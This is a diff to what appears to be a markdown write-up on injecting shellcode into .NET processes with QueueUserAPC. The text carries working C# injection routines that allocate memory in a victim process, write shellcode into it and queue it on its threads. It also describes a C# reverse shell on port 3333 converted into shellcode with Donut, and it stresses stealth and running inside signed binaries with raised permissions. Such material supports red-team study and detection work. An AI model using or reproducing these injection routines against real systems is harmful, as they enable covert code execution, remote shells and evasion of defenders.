@@ -84,7 +84,7 @@ The full source code is in the [repository](https://github.com/wireless90/Proces
 
 The shellcode is going to be a simple reverse shell written in C#. Its a reverse shell that connects to port `3333`
 
-Code can be found [here](https://github.com/wireless90/ProcessInjector.NET/tree/main/ProcessInjector/SimpleReverseShell.Net);
+Code can be found [here](https://github.com/wireless90/ProcessInjector.NET/tree/main/ProcessInjector/ShellCode);
 
 I then used [Donut](https://github.com/TheWover/donut) to compile our MSIL binary into a shellcode.
 
@@ -103,7 +103,7 @@ D:\Users\Razali\Source\Repos\donut>donut.exe -a2 -f2 -cShellCode.Program -mMain 
   [ Shellcode     : "myshellcode.txt"
 ```
 
-`-a2` specifies to compiled the shellcode to `amd64`
+`-a2` specifies to compile the shellcode to `amd64`
 
 `-f2` specifies to encode it to `base64`
 
@@ -129,11 +129,10 @@ This example demonstrates that after injecting the shellcode within the calling 
 ```cs
 static void SelfInject(byte[] shellcode)
 {
-  IntPtr resultPtr = VirtualAlloc(0, shellcode.Length, 0x00001000, 0x40);
-  IntPtr bytesWritten = IntPtr.Zero;
-  Marshal.Copy(shellcode, 0, resultPtr, shellcode.Length);
-  uint ptr = QueueUserAPC(resultPtr, GetCurrentThread(), 0);
-  Console.WriteLine("Goodbye");
+	IntPtr allocatedSpacePtr = VirtualAlloc(0, shellcode.Length, 0x00001000, 0x40);
+	Marshal.Copy(shellcode, 0, allocatedSpacePtr, shellcode.Length);
+	QueueUserAPC(allocatedSpacePtr, GetCurrentThread(), 0);
+	Console.WriteLine("Goodbye");
 }
 ```
 
@@ -155,23 +154,23 @@ Thus, I tried injecting the APC into a `Windows Form`, which takes a longer time
 ```cs
 static void InjectRunningProcessUsingRaceCondition(byte[] shellcode, string victimProcessPath)
 {
-			STARTUPINFO startupinfo = new STARTUPINFO();
-			PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();
+	STARTUPINFO startupinfo = new STARTUPINFO();
+	PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();
 			
-			CreateProcess(null, victimProcessPath, 0, 0, false, 0, 0, null, ref startupinfo, ref processInformation);
+	CreateProcess(null, victimProcessPath, 0, 0, false, 0, 0, null, ref startupinfo, ref processInformation);
 
-			IntPtr allocatedSpacePtr = VirtualAllocEx(processInformation.hProcess, IntPtr.Zero, shellcode.Length, 0x00001000, 0x40);
-			IntPtr bytesWritten = IntPtr.Zero;
+	IntPtr allocatedSpacePtr = VirtualAllocEx(processInformation.hProcess, IntPtr.Zero, shellcode.Length, 0x00001000, 0x40);
+	IntPtr bytesWritten = IntPtr.Zero;
 			
-			WriteProcessMemory(processInformation.hProcess, allocatedSpacePtr, shellcode, shellcode.Length, out bytesWritten);
+	WriteProcessMemory(processInformation.hProcess, allocatedSpacePtr, shellcode, shellcode.Length, out bytesWritten);
 
-			Process process = Process.GetProcessById(processInformation.dwProcessId);
-			foreach (ProcessThread thread in process.Threads)
-			{
-				IntPtr threadHandle = OpenThread(0x0010, false, thread.Id);
-				VirtualProtectEx(processInformation.hProcess, allocatedSpacePtr, shellcode.Length, 0x20, out _);
-				QueueUserAPC(allocatedSpacePtr, threadHandle, 0);
-			}
+	Process process = Process.GetProcessById(processInformation.dwProcessId);
+	foreach (ProcessThread thread in process.Threads)
+	{
+		IntPtr threadHandle = OpenThread(0x0010, false, thread.Id);
+		VirtualProtectEx(processInformation.hProcess, allocatedSpacePtr, shellcode.Length, 0x20, out _);
+		QueueUserAPC(allocatedSpacePtr, threadHandle, 0);
+	}
 }
 ```
 
@@ -185,6 +184,31 @@ As confirmed in our first example, our APC would get executed after the program 
 
 I simulated it by simply letting my `Windows Form` boot up first, giving it a headstart by pausing using `Thread.Sleep` in my injector code, after which I perform the injection.
 
+```cs
+static void InjectRunningProcess(byte[] shellcode, string victimProcessPath)
+{
+	STARTUPINFO startupinfo = new STARTUPINFO();
+	PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();
+
+	CreateProcess(null, victimProcessPath, 0, 0, false, 0, 0, null, ref startupinfo, ref processInformation);
+
+	//Thread sleep is used here to give the victim process time to load and run its main thread.
+	//We do not want to race against it.
+	Thread.Sleep(3000);
+
+	IntPtr allocatedSpacePtr = VirtualAllocEx(processInformation.hProcess, IntPtr.Zero, shellcode.Length, 0x00001000, 0x40);
+	IntPtr bytesWritten = IntPtr.Zero;
+
+	WriteProcessMemory(processInformation.hProcess, allocatedSpacePtr, shellcode, shellcode.Length, out bytesWritten);
+	Process process = Process.GetProcessById(processInformation.dwProcessId);
+	foreach (ProcessThread thread in process.Threads)
+	{
+		IntPtr threadHandle = OpenThread(0x0010, false, thread.Id);
+		VirtualProtectEx(processInformation.hProcess, allocatedSpacePtr, shellcode.Length, 0x20, out _);
+		QueueUserAPC(allocatedSpacePtr, threadHandle, 0);
+	}
+}
+```
 As expected, the moment I close the application, we gain a reverse shell.
 
 ![image](https://user-images.githubusercontent.com/12537739/126814235-5418158e-9bf0-48cb-b833-85c9d42c1b3f.png)
@@ -197,7 +221,7 @@ After exiting the form, we gain a reverse shell.
 
 # Conclusion
 
-We say that the CLR would always make the main thread alertable, which we can leverage on using the QueueUserAPC injection method. Although we could call the alertable method ourselves, allowing the CLR to call it for us makes it more stealthy. We also saw that this could be exploited for any .NET executables.
+We saw that the CLR would always make the main thread alertable, which we can leverage on using the QueueUserAPC injection method. Although we could call the alertable method ourselves, allowing the CLR to call it for us makes it more stealthy. We also saw that this could be exploited for any .NET executables.
 
 As [Dwight Hohnstein](https://posts.specterops.io/the-curious-case-of-queueuserapc-3f62e966d2cb) concluded in his blogpost, one can then leverage on hooking into the task schedular events and injecting into one of the scheduled programs. This would allow our code to be ran in a "signed" binary, or be ran with leveraged permissions.
 
